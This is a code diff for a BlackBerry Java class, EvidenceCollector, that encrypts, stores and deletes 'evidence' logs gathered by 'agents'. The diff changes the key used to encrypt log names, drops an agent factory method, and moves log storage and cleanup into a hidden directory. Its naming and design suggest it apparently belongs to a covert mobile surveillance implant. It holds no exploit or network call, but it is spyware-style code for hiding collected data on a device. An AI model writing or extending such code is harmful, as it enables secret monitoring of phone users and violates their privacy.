@@ -20,7 +20,6 @@ import net.rim.device.api.system.PersistentObject;
 import net.rim.device.api.system.PersistentStore;
 import net.rim.device.api.system.RuntimeStore;
 import net.rim.device.api.util.NumberUtilities;
-import blackberry.agent.Agent;
 import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Check;
@@ -74,7 +73,7 @@ public final class EvidenceCollector implements Singleton {
      */
     public static String decryptName(final String logMask) {
         return Encryption.decryptName(logMask, Encryption.getKeys()
-                .getChallengeKey()[0]);
+                .getProtoKey()[0]);
     }
 
     /**
@@ -86,7 +85,7 @@ public final class EvidenceCollector implements Singleton {
      */
     public static String encryptName(final String logMask) {
         return Encryption.encryptName(logMask, Encryption.getKeys()
-                .getChallengeKey()[0]);
+                .getProtoKey()[0]);
     }
 
     /**
@@ -126,7 +125,7 @@ public final class EvidenceCollector implements Singleton {
 
         logProgressive = deserializeProgressive();
         keys = Encryption.getKeys();
-        seed = keys.getChallengeKey()[0];
+        seed = keys.getProtoKey()[0];
     }
 
     private void clear() {
@@ -155,23 +154,6 @@ public final class EvidenceCollector implements Singleton {
         final int logProgressiveRet = ((Integer) logProgressivePersistent
                 .getContents()).intValue();
         return logProgressiveRet;
-    }
-
-    /**
-     * Factory.
-     * 
-     * @param agent
-     *            the agent
-     * @param onSD
-     *            the on sd
-     * @return the log
-     */
-    public synchronized Evidence factory(final Agent agent, final boolean onSD) {
-
-        final Evidence log = new Evidence(agent.agentId, agent.onSD(),
-                keys.getAesKey());
-
-        return log;
     }
 
     /**
@@ -221,7 +203,7 @@ public final class EvidenceCollector implements Singleton {
         //#endif
 
         final Vector vector = new Vector();
-        final String basePath = onSD ? Path.SD() : Path.USER();
+        final String basePath = Path.logs();
 
         final String blockDir = "_" + (progressive / LOG_PER_DIRECTORY);
 
@@ -283,15 +265,10 @@ public final class EvidenceCollector implements Singleton {
         //#ifdef DEBUG
         debug.info("removeLogDirs");
         //#endif
-        
-        
+                
         int removed = 0;
-        
-        if(Path.isSDAvailable()){
-         removed = removeLogRecursive(Path.SD(), numFiles);
-        }
-        
-        removed += removeLogRecursive(Path.USER(), numFiles - removed);
+
+        removed = removeLogRecursive(Path.hidden(), numFiles - removed);
         return removed;
     }
 
